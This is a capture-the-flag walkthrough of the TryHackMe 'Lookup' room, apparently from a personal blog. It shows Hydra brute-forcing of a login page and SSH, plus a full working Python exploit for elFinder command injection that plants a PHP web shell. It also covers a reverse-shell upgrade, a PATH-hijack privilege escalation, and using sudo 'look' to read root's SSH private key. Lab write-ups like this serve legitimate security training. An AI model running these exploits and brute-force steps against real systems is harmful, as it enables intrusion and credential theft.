---
title: "Hacking Practice: TryHackMe Lookup Room Explained"
seoDescription: "Guide for TryHackMe Lookup room: covers initial access, root shell, hacking practice, and privilege escalation learning"
datePublished: Thu Jan 09 2025 09:00:25 GMT+0000 (Coordinated Universal Time)
cuid: cm5p3lnzc000s0alg7mj35trh
slug: hacking-practice-tryhackme-lookup-room-explained
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1736412440479/c6d72928-63de-4822-a2f7-5a8a2e62ef3c.png
tags: linux, hacking, cybersecurity-1, tryhackme

---

# Overview

**Lookup** is a Linux machine challenge where we first encounter a login webpage. The login page responds differently depending on whether the user exists. After enumerating valid usernames, we brute-force credentials for the found user using Hydra. After a successful login, we are redirected to `ElFinder`, a web file manager vulnerable to PHP command injection. We modify the script for Python 3.

After gaining initial access as the `www-data` user, we enumerate and find a user `think` along with an ELF SUID executable `/usr/sbin/pwm`. This SUID executable runs the `id` command to impersonate the current user and read the `/home/<current_user>/.passwords` file. Since `PWM` doesn’t use an absolute path, we create our own `id` executable under `/tmp/id` and add it to the `PATH` to impersonate user `think`.

The `.passwords` file contains a list of possible passwords, which we use to brute-force the `think` user's SSH login. We then discover that the user `think` can only execute the `look` command with `sudo`. Using this, we obtain the root user's SSH private key (`id_rsa`) to log in and retrieve the root flag.

# Passive Enumeration

**Port Scan**

```bash
sudo nmap -sS -sV <ip>
```

* The port scan reveals two open ports:
    
    * HTTP Port: **80**
        
    * SSH Port: **22**
        

Visiting the target IP in a browser redirects to `lookup.thm`, so we need to add that to the `/etc/hosts` file.

```bash
echo "<target_ip> lookup.thm" | sudo tee -a /etc/hosts
```

**Directory Brute-Force on Port 80**

```bash
feroxbuster --url="http://lookup.thm" --wordlist /usr/share/SecLists/Discovery/Web-Content/raft-large-extensions.txt
```

* No luck with directory brute-force.
    

After trying a full port scan, SSH brute-force, `sqlmap`, and `nikto`, I wasted about an hour with no useful results.

## Finding Valid Usernames & Passwords

I tried basic credentials on the login page, such as `admin:admin`, `test:password`. After a few attempts, I noticed that the webpage responds differently when the user `admin` is entered, showing `Wrong Password`, and for any other users, it shows `Wrong Password or Username`. I brute-forced the password for `admin` but didn’t have any luck. This could mean that the server is returning valid passwords for different users. Why? could be bad coding practices, so I explored the possibility of other valid users.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411857400/c11b224e-acf3-4504-ba5c-b6a1bc5cf4c5.png align="left")

**Enumerate Valid Users**

```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -p password lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username" -I
```

* Found User: `j-fake-name`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411885090/4498c4bc-ad4c-4f0e-8e10-a9efc27f2fad.png align="left")

I then brute-forced the password for `j-fake-name`:

```bash
hydra -l j-fake-name -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -I
```

* Found Password for `j-fake-name`: `j-fake-password`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411907660/23b16c28-6626-4550-a1f0-630cfc3bbb57.png align="left")

### Getting Initial Access (Shell)

After logging in with valid credentials, I was redirected to `files.lookup.thm`, so I added it to `/etc/hosts`.

```bash
echo "<target_ip> files.lookup.thm" | sudo tee -a /etc/hosts
```

This is `ElFinder`, a web file manager. From the `?` button icon in menu section, I identified the version of `ElFinder`. A Google search for `ElFinder 2.1.47 exploit` led me to an exploit on Exploit-DB, which revealed that this version is vulnerable to PHP command injection.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411932620/bd6f4f9e-14bd-443a-b96a-8b1523b7c4c4.png align="left")

We can use the Exploit-DB script with a few modifications, or alternatively, we can use Metasploit. I'll demonstrate both methods.

**First, Exploit-DB Script**

The script uploads a JPG file to the file server, using an encoded payload as the image filename. However, there is an issue: I don’t have Python2 installed. This should not be a problem for Kali Linux users, as it comes pre-packaged with Python2. Below is the modified Python3 script.

```python
#!/usr/bin/python
# exploit.py
import requests
import json
import sys

payload = "SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg"

def usage():
    if len(sys.argv) != 2:
        print("Usage: python exploit.py [URL]")
        sys.exit(0)


def upload(url, payload):
    files = {"upload[]": (payload, open("SecSignal.jpg", "rb"))}
    data = {
        "reqid": "1693222c439f4",
        "cmd": "upload",
        "target": "l1_Lw",
        "mtime[]": "1497726174",
    }

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j["added"][0]["hash"]


def imgRotate(url, hash):
    r = requests.get(
        "%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c"
        % (url, hash)
    )
    return r.text


def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")
        while 1:
            try:
                inp = input("$ ")
                r = requests.get("%s/php/SecSignal.php?c=%s" % (url, inp))
                print(r.text)
            except KeyboardInterrupt:

                sys.exit("\nBye kaker!")
    else:
        print("[*] The site seems not to be vulnerable :(")


def main():
    usage()
    url = sys.argv[1]
    print("[*] Uploading the malicious image...")
    hash = upload(url, payload)
    print("[*] Running the payload...")
    imgRotate(url, hash)
    shell(url)


if __name__ == "__main__":
    main()
```

To get the shell, copy a `jpg` image to the current working directory, rename it to `SecSignal.jpg`, and run:

```bash
python exploit.py http://files.lookup.thm/elFinder
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411966935/be364ccc-a6e2-45ee-83b1-543486f07a94.png align="left")

Next, we upgrade the shell for better control. I first tried a `Bash -i` reverse shell, which didn’t work. Then I used a `nc mkfiko` reverse shell (from [revshells.com](http://revshells.com)) in URL-encoded format because the connection is over HTTP. Replace the IP and port accordingly, and start a `nc` server on the host machine. (Make sure the firewall is disabled or the port is allowed; otherwise, the reverse shell might not work.)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736411996668/1576cba6-ece6-4244-a96b-a43719dbc7b8.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412009455/f2d4ad02-a17b-4656-a1e5-d7f26e6f0126.png align="left")

To stabilize the `nc` shell:

```bash
export TERM=xterm
bash -i
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412025167/b104acbe-7d7e-42fb-a25a-9a89b57341de.png align="left")

**Now, Metasploit Way**

Using Metasploit is much easier since it already has an exploit module for this vulnerability, which provides a fully functional meterpreter session.

```bash
msf6> use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
msf6> set RHOSTS files.lookup.thm
msf6> set LHOST tun0
msf6> run

meterpreter> shell
```

# Privilege Escalation

After gaining initial access as `www-data`, I navigated to `/home` and found a user named `think`. This user's directory contained two interesting files: `user.txt` (the flag) and `.passwords`, which likely contains the password for `think` user. However, I couldn't access them as I wasn’t logged in as `think`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412041788/db8a1dfe-1177-4492-83ab-4279d3cc3726.png align="left")

**Find SUID Executables for Privilege Escalation**

```bash
find / -perm -4000 2>/dev/null
```

* I found an unknown binary owned by root with the SUID bit set: `/usr/sbin/pwm`.
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412057097/ebb5b590-c010-41f5-83bb-e5567174cfd7.png align="left")

## Getting User Shell

Executing `/usr/sbin/pwm` reveals that it runs the `id` command to impersonate the user and read the `.passwords` file in the user's home directory.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412076090/19d94f31-ab6d-4b1d-8244-689f56410013.png align="left")

Simple `ltrace` and `strace` didn’t reveal anything useful, so I assumed the `pwm` binary doesn’t use an absolute path for the `id` command. This means we can perform a *Path Hijack*, where we create our own `id` command and add it to the `PATH` variable. This way, when `pwm` executes, it will run our custom `id` command instead of the real one.

Our custom `id` command will return the `id` of the `think` user, and `pwm` will print the `.passwords` file of the returned user ID.

```bash
# Create the `id` command under /tmp/id
cat > /tmp/id << EOF
#!/bin/bash
echo '$(id think)'
EOF

# Give executable permission to /tmp/id
chmod +x /tmp/id

# Add /tmp/ to the `PATH` variable
export PATH=/tmp:$PATH

# Execute `pwm` to get the `/home/think/.passwords` file
/usr/sbin/pwm
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412096642/c4ce2861-7a79-4bba-b022-7a3fd10398f9.png align="left")

We now have the `.passwords` file, which contains a list of passwords. I copied them to my host machine to brute-force the `think` user's SSH login.

```bash
hydra -l think -P passwords.txt 10.10.73.36 ssh
```

* Password Found: `think-fake-password`
    

I SSHed into the `think` user and retrieved the `user.txt` flag. Next, get the root shell.

## Getting the Root Shell

This step was straightforward. The `think` user can only run the `look` command with `sudo`.

```bash
sudo -l
```

I searched for `look` on [GTFOBins](https://gtfobins.github.io/) to check for privilege escalation options.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412115849/76bd34fc-1c78-4d7c-8f12-29341d261b33.png align="left")

There are two ways to proceed: first, directly access the flag:

```bash
LFILE=/root/root.txt
sudo look '' "$LFILE"
```

Alternatively, copy the root's SSH private key to the host machine and SSH into the target as root.

```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

Copy the private key to the host machine as `id_rsa` and run:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@lookup.thm
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1736412138449/148675c4-870b-43be-87a1-3264f1150025.png align="left")

**Target PWNED!**

---

Thanks for reading! I hope you learnt something new. This is my first CTF walkthrough write-up. You can check out my blog [FlareXes](https://flarexes.com/) for more cybersecurity, programming, Linux, privacy, and automation content.